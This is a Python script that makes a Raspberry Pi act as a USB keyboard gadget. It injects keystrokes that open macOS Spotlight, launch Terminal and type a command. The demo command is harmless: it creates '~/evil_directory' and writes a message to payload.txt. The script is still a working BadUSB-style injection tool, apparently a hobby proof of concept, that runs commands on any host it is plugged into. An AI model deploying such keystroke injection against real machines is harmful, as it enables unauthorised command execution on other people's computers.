#!/usr/bin/env python3
import time

HID_DEVICE = '/dev/hidg0'
REPORT_SIZE = 8
RELEASE_KEY = [0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0]


MOD_LEFT_SHIFT      = 0x02
MOD_LEFT_CONTROL    = 0x01
MOD_RIGHT_SHIFT     = 0x20
MOD_RIGHT_CONTROL   = 0x10
MOD_LEFT_ALT        = 0x04
MOD_RIGHT_ALT       = 0x40
MOD_LEFT_GUI        = 0x08 # (Windows/Command)
MOD_RIGHT_GUI       = 0x80
SPACE_BAR           = 0x2C

ALPHABET = {
    'a': 0x04, 'b': 0x05, 'c': 0x06, 'd': 0x07, 'e': 0x08,
    'f': 0x09, 'g': 0x0A, 'h': 0x0B, 'i': 0x0C, 'j': 0x0D,
    'k': 0x0E, 'l': 0x0F, 'm': 0x10, 'n': 0x11, 'o': 0x12,
    'p': 0x13, 'q': 0x14, 'r': 0x15, 's': 0x16, 't': 0x17,
    'u': 0x18, 'v': 0x19, 'w': 0x1A, 'x': 0x1B, 'y': 0x1C,
    'z': 0x1D,
    ' ': 0x2C, '\n': 0x28, '-': 0x2D, '`': 0x35, '/': 0x38,
    '_': 0x2D, ';': 0x33, '.': 0x37, "'": 0x34,
    '9': 0x26, '0': 0x27
}

def write_report(fd, bytes_report):
    fd.write(bytes_report)
    fd.flush()


# This is the size of the data send when is pressed a key in the keyboard
# B.1 Protocol 1 (Keyboard) - PDF
#----------------------------------------------
#| 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 |
#----------------------------------
# 0 Modifier keys
# 1 Reserved
# 2 Keycode 1
# 3 Keycode 2
# 4 Keycode 3
# 5 Keycode 4
# 6 Keycode 5
# 7 Keycode 6
def send_key(fd, modifier, key_code):
    report_array = bytearray(REPORT_SIZE)

    if modifier is not None:
        report_array[0] = modifier

    if (modifier is not MOD_LEFT_GUI and modifier is not MOD_RIGHT_GUI):
        if key_code == '~':
            report_array[0] = MOD_RIGHT_SHIFT
            key_code = '`'
        elif key_code == '"':
            report_array[0] = MOD_RIGHT_SHIFT
            key_code = "'"
        elif key_code == '(':
            report_array[0] = MOD_RIGHT_SHIFT
            key_code = '9'
        elif key_code == ')':
            report_array[0] = MOD_RIGHT_SHIFT
            key_code = '0'
        elif key_code == '>':
            report_array[0] = MOD_RIGHT_SHIFT
            key_code = '.'

        report_array[2] = ALPHABET[key_code]
    else: 
        report_array[2] = key_code

    #print(report_array)
    write_report(fd, report_array)
    time.sleep(0.06)
    write_report(fd, bytearray(RELEASE_KEY))
    time.sleep(0.06)

def send_text(fd, text):
    for char in text:
        send_key(fd, None, char)


def main():
    with open(HID_DEVICE, 'wb') as fd:

        send_key(fd, MOD_LEFT_GUI, SPACE_BAR)
        print("spotlight open")
        time.sleep(2.0)
        print("por enviar teclas")
        send_text(fd, "terminal")
        time.sleep(0.3)
        
        send_text(fd, "\n")
        send_text(fd, 'mkdir -p ~/evil_directory; echo "automatizando teclado hid. ejecutando de forma automatica un script en el computador host al conectar la raspberry ;)" > ~/evil_directory/payload.txt')
        send_text(fd, "\n")


if __name__ == "__main__":
    main()